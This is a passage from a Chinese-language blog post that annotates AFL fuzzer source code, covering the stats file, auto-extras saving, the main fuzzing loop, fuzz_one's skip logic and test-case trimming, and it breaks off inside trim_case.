class="number">1</span>) : <span class="number">0</span>, total_execs, eps, queued_paths,</span><br><span class="line">          queued_favored, queued_discovered, queued_imported, max_depth,</span><br><span class="line">          current_entry, pending_favored, pending_not_fuzzed, queued_variable,</span><br><span class="line">          stability, bitmap_cvg, unique_crashes, unique_hangs,</span><br><span class="line">          last_path_time / <span class="number">1000</span>, last_crash_time / <span class="number">1000</span>, last_hang_time / <span class="number">1000</span>,</span><br><span class="line">          total_execs - last_crash_execs, exec_tmout, use_banner,</span><br><span class="line">          </span><br><span class="line">          <span class="comment">/* 构建目标模式字符串 */</span></span><br><span class="line">          qemu_mode ? <span class="string">&quot;qemu &quot;</span> : <span class="string">&quot;&quot;</span>,           <span class="comment">// QEMU 模式</span></span><br><span class="line">          dumb_mode ? <span class="string">&quot; dumb &quot;</span> : <span class="string">&quot;&quot;</span>,           <span class="comment">// 哑模式</span></span><br><span class="line">          no_forkserver ? <span class="string">&quot;no_forksrv &quot;</span> : <span class="string">&quot;&quot;</span>,  <span class="comment">// 无 fork 服务器</span></span><br><span class="line">          crash_mode ? <span class="string">&quot;crash &quot;</span> : <span class="string">&quot;&quot;</span>,          <span class="comment">// 崩溃模式</span></span><br><span class="line">          persistent_mode ? <span class="string">&quot;persistent &quot;</span> : <span class="string">&quot;&quot;</span>, <span class="comment">// 持久模式</span></span><br><span class="line">          deferred_mode ? <span class="string">&quot;deferred &quot;</span> : <span class="string">&quot;&quot;</span>,    <span class="comment">// 延迟模式</span></span><br><span class="line">          </span><br><span class="line">          <span class="comment">/* 如果没有特殊模式，显示 &quot;default&quot; */</span></span><br><span class="line">          (qemu_mode || dumb_mode || no_forkserver || crash_mode ||</span><br><span class="line">           persistent_mode || deferred_mode)</span><br><span class="line">              ? <span class="string">&quot;&quot;</span></span><br><span class="line">              : <span class="string">&quot;default&quot;</span>,</span><br><span class="line">          </span><br><span class="line">          orig_cmdline, slowest_exec_ms);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 忽略错误 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 获取子进程的 RSS（常驻内存集）值</span></span><br><span class="line"><span class="comment">     在调用 getrusage 之前，我们必须已经杀死了 forkserver 进程并调用了 waitpid */</span></span><br><span class="line">  <span class="keyword">if</span> (getrusage(RUSAGE_CHILDREN, &amp;usage)) &#123;</span><br><span class="line">    WARNF(<span class="string">&quot;getrusage failed&quot;</span>);  <span class="comment">// 获取资源使用失败，发出警告</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (usage.ru_maxrss == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* RSS 值为 0，说明 AFL 正在运行中，无法获取准确值 */</span></span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">&quot;peak_rss_mb       : not available while afl is running\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="comment">/* macOS 系统中 ru_maxrss 单位是字节，需要右移 20 位转换为 MB */</span></span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">&quot;peak_rss_mb       : %zu\n&quot;</span>, usage.ru_maxrss &gt;&gt; <span class="number">20</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">/* Linux 系统中 ru_maxrss 单位是 KB，需要右移 10 位转换为 MB */</span></span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">&quot;peak_rss_mb       : %zu\n&quot;</span>, usage.ru_maxrss &gt;&gt; <span class="number">10</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  fclose(f);  <span class="comment">// 关闭文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把之前测试的结果都写入到fuzzer_stats中如下<br><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250924164224968.png" alt="fuzzer_stats"></p><h2 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto"></a>save_auto</h2><p>这里auto_changed如果为0则说明没有需要保存的数据，直接返回<br>如果不为零则保存到$OUT/.state/auto_extras/</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_auto</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    u32 i;  <span class="comment">// 循环计数器</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查是否有需要保存的更改</span></span><br><span class="line">    <span class="comment">// 如果auto_changed标志为false，说明没有新的数据需要保存，直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (!auto_changed)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重置更改标志，表示即将处理所有待保存的更改</span></span><br><span class="line">    auto_changed = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 遍历所有需要保存的自动提取数据</span></span><br><span class="line">    <span class="comment">// MIN(USE_AUTO_EXTRAS, a_extras_cnt) 确保不会超过预设的最大数量或实际数据数量</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MIN(USE_AUTO_EXTRAS, a_extras_cnt); i++) &#123;</span><br><span class="line">        <span class="comment">// 构造保存文件的完整路径</span></span><br><span class="line">        <span class="comment">// 格式: &#123;output_dir&#125;/queue/.state/auto_extras/auto_&#123;6位数字编号&#125;</span></span><br><span class="line">        u8 *fn = alloc_printf(<span class="string">&quot;%s/queue/.state/auto_extras/auto_%06u&quot;</span>, out_dir, i);</span><br><span class="line">        </span><br><span class="line">        s32 fd;  <span class="comment">// 文件描述符</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建/打开文件进行写入</span></span><br><span class="line">        <span class="comment">// O_WRONLY: 只写模式</span></span><br><span class="line">        <span class="comment">// O_CREAT: 如果文件不存在则创建</span></span><br><span class="line">        <span class="comment">// O_TRUNC: 如果文件存在则截断为0长度（清空文件）</span></span><br><span class="line">        <span class="comment">// 0600: 文件权限，所有者可读写，其他用户无权限</span></span><br><span class="line">        fd = open(fn, O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0600</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查文件是否成功打开</span></span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">            PFATAL(<span class="string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);  <span class="comment">// 致命错误，程序将退出</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将第i个额外数据写入文件</span></span><br><span class="line">        <span class="comment">// a_extras[i].data: 数据内容指针</span></span><br><span class="line">        <span class="comment">// a_extras[i].len: 数据长度</span></span><br><span class="line">        <span class="comment">// fn: 文件名（用于错误报告）</span></span><br><span class="line">        ck_write(fd, a_extras[i].data, a_extras[i].len, fn);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 关闭文件描述符</span></span><br><span class="line">        close(fd);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 释放为文件名分配的内存</span></span><br><span class="line">        ck_free(fn);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上就做完了基本的处理，后面就是fuzz的主要流程了</p><h1 id="FUZZ主循环"><a href="#FUZZ主循环" class="headerlink" title="FUZZ主循环"></a>FUZZ主循环</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;  <span class="comment">// 无限循环，直到收到停止信号</span></span><br><span class="line"></span><br><span class="line">    u8 skipped_fuzz;  <span class="comment">// 标记是否跳过了当前的模糊测试</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 1. 队列精简 ===== </span></span><br><span class="line"><span class="comment">     * cull_queue() 会标记&quot;favored&quot;测试用例</span></span><br><span class="line"><span class="comment">     * 这些是能覆盖最多代码路径的最小测试集</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    cull_queue();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 2. 队列循环管理 ===== */</span></span><br><span class="line">    <span class="keyword">if</span> (!queue_cur) &#123;  <span class="comment">// 如果当前队列指针为空（到达队列末尾）</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 开始新的队列循环 */</span></span><br><span class="line">      queue_cycle++;           <span class="comment">// 队列循环计数器+1</span></span><br><span class="line">      current_entry = <span class="number">0</span>;       <span class="comment">// 重置当前条目索引</span></span><br><span class="line">      cur_skipped_paths = <span class="number">0</span>;   <span class="comment">// 重置跳过的路径计数</span></span><br><span class="line">      queue_cur = <span class="built_in">queue</span>;       <span class="comment">// 将队列指针重置到队列头部</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 处理seek_to：允许从特定位置恢复 */</span></span><br><span class="line">      <span class="keyword">while</span> (seek_to) &#123;</span><br><span class="line">        current_entry++;</span><br><span class="line">        seek_to--;</span><br><span class="line">        queue_cur = queue_cur-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 显示统计信息 */</span></span><br><span class="line">      show_stats();</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 如果不在TTY（终端）环境，输出日志 */</span></span><br><span class="line">      <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">        ACTF(<span class="string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* ===== 3. 拼接策略决策 ===== </span></span><br><span class="line"><span class="comment">       * 如果整个队列循环都没有新发现，尝试拼接策略</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (queued_paths == prev_queued) &#123;</span><br><span class="line">        <span class="comment">// 没有新的测试用例加入队列</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (use_splicing)</span><br><span class="line">          cycles_wo_finds++;  <span class="comment">// 增加&quot;无新发现&quot;的循环计数</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          use_splicing = <span class="number">1</span>;   <span class="comment">// 启用拼接策略</span></span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">        cycles_wo_finds = <span class="number">0</span>;  <span class="comment">// 有新发现，重置计数器</span></span><br><span class="line"></span><br><span class="line">      prev_queued = queued_paths;  <span class="comment">// 更新上一次的队列路径数</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 首次同步：如果设置了AFL_IMPORT_FIRST环境变量 */</span></span><br><span class="line">      <span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; getenv(<span class="string">&quot;AFL_IMPORT_FIRST&quot;</span>))</span><br><span class="line">        sync_fuzzers(use_argv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 4. 执行模糊测试 ===== </span></span><br><span class="line"><span class="comment">     * fuzz_one() 对当前队列条目执行一轮模糊测试</span></span><br><span class="line"><span class="comment">     * 返回值表示是否跳过了这个条目</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    skipped_fuzz = fuzz_one(use_argv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 5. 定期同步 ===== </span></span><br><span class="line"><span class="comment">     * 如果启用了并行模糊测试，定期与其他fuzzer实例同步</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">      <span class="comment">// SYNC_INTERVAL 定义同步间隔</span></span><br><span class="line">      <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">        sync_fuzzers(use_argv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 6. 退出检查 ===== */</span></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1)</span><br><span class="line">      stop_soon = <span class="number">2</span>;  <span class="comment">// 程序化退出标记</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon)</span><br><span class="line">      <span class="keyword">break</span>;  <span class="comment">// 退出主循环</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ===== 7. 移动到下一个队列条目 ===== */</span></span><br><span class="line">    queue_cur = queue_cur-&gt;next;</span><br><span class="line">    current_entry++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ========== 循环结束后的清理工作 ========== */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果还有当前队列项，显示最终统计 */</span></span><br><span class="line">  <span class="keyword">if</span> (queue_cur)</span><br><span class="line">    show_stats();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 进程清理 ===== </span></span><br><span class="line"><span class="comment">   * stop_soon == 2 表示程序化停止（非用户中断）</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (stop_soon == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>)</span><br><span class="line">      kill(child_pid, SIGKILL);      <span class="comment">// 终止子进程（被测试程序）</span></span><br><span class="line">    <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>)</span><br><span class="line">      kill(forksrv_pid, SIGKILL);    <span class="comment">// 终止fork服务器</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 等待fork服务器结束，以获取资源使用统计 */</span></span><br><span class="line">  <span class="keyword">if</span> (waitpid(forksrv_pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    WARNF(<span class="string">&quot;error waitpid\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 保存最终状态 ===== */</span></span><br><span class="line">  write_bitmap();           <span class="comment">// 写入覆盖率位图</span></span><br><span class="line">  write_stats_file(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 写入统计文件</span></span><br><span class="line">  save_auto();              <span class="comment">// 自动保存</span></span><br><span class="line"></span><br><span class="line">stop_fuzzing:  <span class="comment">// 跳转标签</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 输出结束信息 */</span></span><br><span class="line">  SAYF(CURSOR_SHOW cLRD <span class="string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,</span><br><span class="line">       stop_soon == <span class="number">2</span> ? <span class="string">&quot;programmatically&quot;</span> : <span class="string">&quot;by user&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 警告信息 ===== </span></span><br><span class="line"><span class="comment">   * 如果运行超过30分钟但还在第一个循环，可能结果不完整</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (queue_cycle == <span class="number">1</span> &amp;&amp; get_cur_time() - start_time &gt; <span class="number">30</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span> cYEL <span class="string">&quot;[!] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    (For info on resuming, see %s/README.)\n&quot;</span>,</span><br><span class="line">         doc_path);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* ===== 资源释放 ===== */</span></span><br><span class="line">  fclose(plot_file);        <span class="comment">// 关闭绘图文件</span></span><br><span class="line">  destroy_queue();          <span class="comment">// 销毁测试队列</span></span><br><span class="line">  destroy_extras();         <span class="comment">// 销毁额外的字典条目</span></span><br><span class="line">  ck_free(target_path);     <span class="comment">// 释放目标路径内存</span></span><br><span class="line">  ck_free(sync_id);         <span class="comment">// 释放同步ID内存</span></span><br><span class="line"></span><br><span class="line">  alloc_report();           <span class="comment">// 输出内存分配报告</span></span><br><span class="line"></span><br><span class="line">  OKF(<span class="string">&quot;We&#x27;re done here. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !AFL_LIB */</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个wile循环第一个遇到的就是cull_queue函数，这个函数之前出现过，这里是在while循环中第一次进入，会直接返回，这是因为之前进入过一次，score_changed被清0，且没再进一步进行模糊测试。如果是再次进入且有更好的路径还会再将这个score_changed置为1再次进入。</p><h2 id="fuzz-one"><a href="#fuzz-one" class="headerlink" title="fuzz_one"></a>fuzz_one</h2><p>这里可以看到</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (pending_favored) &#123;</span><br><span class="line"><span class="keyword">if</span> ((queue_cur-&gt;was_fuzzed || !queue_cur-&gt;favored) &amp;&amp;</span><br><span class="line">        UR(<span class="number">100</span>) &lt; SKIP_TO_NEW_PROB)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当还有优选队列的时候，进入这个判断，这里所有的未被fuzz和优选队列一定不会跳过，否则只有百分之1的概率会跳过，也就是优先处理高价值的目标，如果没有优选队列</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;favored &amp;&amp; queued_paths &gt; <span class="number">10</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果没有pending favored，仍可能跳过非favored用例</span></span><br><span class="line"><span class="comment">       对于已经fuzz过的输入，跳过概率更高</span></span><br><span class="line"><span class="comment">       对于从未fuzz过的输入，跳过概率较低 */</span></span><br><span class="line">    <span class="keyword">if</span> (queue_cycle &gt; <span class="number">1</span> &amp;&amp; !queue_cur-&gt;was_fuzzed) &#123;</span><br><span class="line">      <span class="comment">/* 第二轮及以后，对未fuzz的非favored用例 */</span></span><br><span class="line">      <span class="keyword">if</span> (UR(<span class="number">100</span>) &lt; SKIP_NFAV_NEW_PROB)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">/* 已fuzz过的非favored用例 */</span></span><br><span class="line">      <span class="keyword">if</span> (UR(<span class="number">100</span>) &lt; SKIP_NFAV_OLD_PROB)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果没有优选样例的话，而且还存在在队列中的样例有超过10个路径（有足够的测试用例），这里!queue_cur-&gt;favored 是一个防御性编程，这段代码是完全为没有优选样例的情况开展的</p><p>这里如果是一个没有测试过的样例有75%概率跳过，否则有95%的概率跳过</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">  ACTF(<span class="string">&quot;Fuzzing test case #%u (%u total, %llu uniq crashes found)...&quot;</span>,</span><br><span class="line">       current_entry, queued_paths, unique_crashes);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是检测到不是终端就会只打印当前测试样例</p><p>然后打开测试样例</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 将测试用例打开 */</span></span><br><span class="line">fd = open(queue_cur-&gt;fname, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">  PFATAL(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, queue_cur-&gt;fname);</span><br><span class="line"></span><br><span class="line">len = queue_cur-&gt;len;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用mmap将文件映射为私有可写内存 */</span></span><br><span class="line">orig_in = in_buf = mmap(<span class="number">0</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (orig_in == MAP_FAILED)</span><br><span class="line">  PFATAL(<span class="string">&quot;Unable to mmap &#x27;%s&#x27;&quot;</span>, queue_cur-&gt;fname);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 分配输出缓冲区</span></span><br><span class="line"><span class="comment">   虽然可以使用MAP_PRIVATE的mmap，但由于会修改每个字节，</span></span><br><span class="line"><span class="comment">   所以直接分配内存效率相当 */</span></span><br><span class="line">out_buf = ck_alloc_nozero(len);</span><br></pre></td></tr></table></figure><p>并为输出文件创立内存的存储空间,接下来如果当前队列中的测试用例之前校准失败过，这里的校验失败是指在之前的calibrate_case中调用run_target获取的各种fault，这里如果校准失败且失败次数还在允许的重试范围内，然后再次调用calibrate_case，如果返回FAULT_ERROR，则中止fuzzing，然后判断校准结果与当前的崩溃模式不匹配，也就是如果是如果没开crash_mod则res除了FAULT_NONE的情况 cur_skipped_paths就自增，然后跳转到 abandon_entry 标签，也就是跳过这个样例，如果是crash_mod则除了FAULT_CRASH</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 检查当前队列中的测试用例是否之前校准失败过 */</span></span><br><span class="line"><span class="keyword">if</span> (queue_cur-&gt;cal_failed) &#123;</span><br><span class="line">  <span class="comment">/* 默认设置结果为超时错误 */</span></span><br><span class="line">  u8 res = FAULT_TMOUT;</span><br><span class="line">  <span class="comment">/* 检查校准失败次数是否还在允许的重试范围内*/</span></span><br><span class="line">  <span class="keyword">if</span> (queue_cur-&gt;cal_failed &lt; CAL_CHANCES) &#123;</span><br><span class="line">    <span class="comment">/* 重置exec_cksum，让calibrate_case重新执行测试用例，避免使用无效的trace_bits */</span></span><br><span class="line">    queue_cur-&gt;exec_cksum = <span class="number">0</span>;</span><br><span class="line">    res = calibrate_case(argv, queue_cur, in_buf, queue_cycle - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">/*-（如目标程序无法执行），则终止整个fuzzing进程 */</span></span><br><span class="line">    <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">      FATAL(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* 判断是否应该放弃处理这个测试用例：</span></span><br><span class="line"><span class="comment">     1. stop_soon: 用户请求停止fuzzing</span></span><br><span class="line"><span class="comment">     2. res != crash_mode: 校准结果与当前的崩溃模式不匹配</span></span><br><span class="line"><span class="comment">        （crash_mode 通常用于区分是否在寻找崩溃） */</span></span><br><span class="line">  <span class="keyword">if</span> (stop_soon || res != crash_mode) &#123;</span><br><span class="line">    <span class="comment">/* 增加跳过的路径计数器，用于统计信息 */</span></span><br><span class="line">    cur_skipped_paths++;</span><br><span class="line">    <span class="comment">/* 跳转到 abandon_entry 标签，放弃处理当前测试用例，</span></span><br><span class="line"><span class="comment">         继续处理队列中的下一个 */</span></span><br><span class="line">    <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是修剪阶段了,我们先看trim_case函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">/************</span></span><br><span class="line"><span class="comment">   * 修剪阶段</span></span><br><span class="line"><span class="comment">   * 尝试减小测试用例的大小，同时保持相同的代码覆盖率</span></span><br><span class="line"><span class="comment">   ************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 判断是否需要进行修剪：</span></span><br><span class="line"><span class="comment">   - !dumb_mode: 不是哑模式（哑模式下不进行智能优化）</span></span><br><span class="line"><span class="comment">   - !queue_cur-&gt;trim_done: 当前测试用例还没有被修剪过 */</span></span><br><span class="line"><span class="keyword">if</span> (!dumb_mode &amp;&amp; !queue_cur-&gt;trim_done) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 调用 trim_case 函数对当前测试用例进行修剪</span></span><br><span class="line"><span class="comment">       trim_case 会尝试删除测试用例中不影响代码覆盖率的冗余字节</span></span><br><span class="line"><span class="comment">       返回值 res 表示修剪过程中的执行结果 */</span></span><br><span class="line">    u8 res = trim_case(argv, queue_cur, in_buf);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 如果目标程序无法执行（比如二进制文件损坏），直接终止 */</span></span><br><span class="line">    <span class="keyword">if</span> (res == FAULT_ERROR)</span><br><span class="line">      FATAL(<span class="string">&quot;Unable to execute target application&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 如果收到停止信号（用户按 Ctrl-C 或达到时间限制）</span></span><br><span class="line"><span class="comment">       增加跳过计数并放弃当前测试用例 */</span></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) &#123;</span><br><span class="line">      cur_skipped_paths++;</span><br><span class="line">      <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 标记该测试用例已完成修剪，避免重复修剪</span></span><br><span class="line"><span class="comment">       注意：即使修剪过程失败（比如产生崩溃），也不会重试</span></span><br><span class="line"><span class="comment">       这是为了避免无限循环和提高效率 */</span></span><br><span class="line">    queue_cur-&gt;trim_done = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 修剪可能会改变测试用例的长度（删除了冗余字节）</span></span><br><span class="line"><span class="comment">       如果长度发生变化，更新本地的 len 变量以保持一致</span></span><br><span class="line"><span class="comment">       这个 len 会在后续的变异操作中使用 */</span></span><br><span class="line">    <span class="keyword">if</span> (len != queue_cur-&gt;len)</span><br><span class="line">      len = queue_cur-&gt;len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="trim-case"><a href="#trim-case" class="headerlink" title="trim_case"></a>trim_case</h3><p>这个函数对当前测试用例进行修剪 trim_case 会尝试删除测试用例中不影响代码覆盖率的冗余字节，返回值 res 表示修剪过程中的执行结果</p><p>函数首先检查样例大小，样例如果过小，不值得修建就直接返回，使用bytes_trim_in记录所有修建前的文件大小，使用<code>len_p2 = next_p2(q-&gt;len);</code>来获取大于等于q-&gt;len的最小2的幂，<code>remove_len = MAX(len_p2 / TRIM_START_STEPS, TRIM_MIN_BYTES);</code>remove_len 是尝试删除的字节数，取len_p2 / TRIM_START_STEPS和TRIM_MIN_BYTES最大值。</p><p>接下来进入一个while循环，判断条件中TRIM_END_STEPS为1024，如果remove_len&gt;=MAX(len_p2 / TRIM_END_STEPS, TRIM_MIN_BYTES),while循环就一直执行,<br>这里我们看到其中还有一个小循环<code>while (remove_pos &lt; q-&gt;len) </code>，这个小循环会尝试从不同位置删除数据块，调用了write_with_gap</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u8 <span class="title">trim_case</span><span class="params">(<span class="keyword">char</span> **argv, struct queue_entry *q, u8 *in_buf)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 临时缓冲区，用于存储阶段名称 */</span></span><br><span class="line">  <span class="keyword">static</span> u8 tmp[<span class="number">64</span>];</span><br><span class="line">  <span class="comment">/* 用于保存未修改时的执行路径覆盖信息 */</span></span><br><span class="line">  <span class="keyword">static</span> u8 clean_trace[MAP_SIZE];</span><br><span class="line">  <span class="comment">/* needs_write: 标记是否需要写入磁盘</span></span><br><span class="line"><span class="comment">     fault: 记录执行结果（崩溃/超时等） */</span></span><br><span class="line">  u8 needs_write = <span class="number">0</span>, fault = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* 修剪执行计数器，用于定期更新界面 */</span></span><br><span class="line">  u32 trim_exec = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* 每次尝试删除的字节数 */</span></span><br><span class="line">  u32 remove_len;</span><br><span class="line">  <span class="comment">/* 输入长度向上取到2的幂次 */</span></span><br><span class="line">  u32 len_p2;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 虽然在检测到变化行为时修剪器效果会降低，</span></span><br><span class="line"><span class="comment">     但仍有一定作用，所以不检查这种情况 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果测试用例太短（小于5字节），不值得修剪，直接返回 */</span></span><br><span class="line">  <span class="keyword">if</span> (q-&gt;len &lt; <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置阶段名称，用于状态显示 */</span></span><br><span class="line">  stage_name = tmp;</span><br><span class="line">  <span class="comment">/* 统计：累加修剪前的字节数 */</span></span><br><span class="line">  bytes_trim_in += q-&gt;len;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化修剪块大小，从大步长开始</span></span><br><span class="line"><span class="comment">     TRIM_START_STEPS 通常是 16 */</span></span><br><span class="line">  len_p2 = next_p2(q-&gt;len);  <span class="comment">/* 获取大于等于q-&gt;len的最小2的幂 */</span></span><br><span class="line">  remove_len = MAX(len_p2 / TRIM_START_STEPS, TRIM_MIN_BYTES);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 主循环：逐步减小删除块的大小，直到块太小或步数太多</span></span><br><span class="line"><span class="comment">     TRIM_END_STEPS 通常是 1024 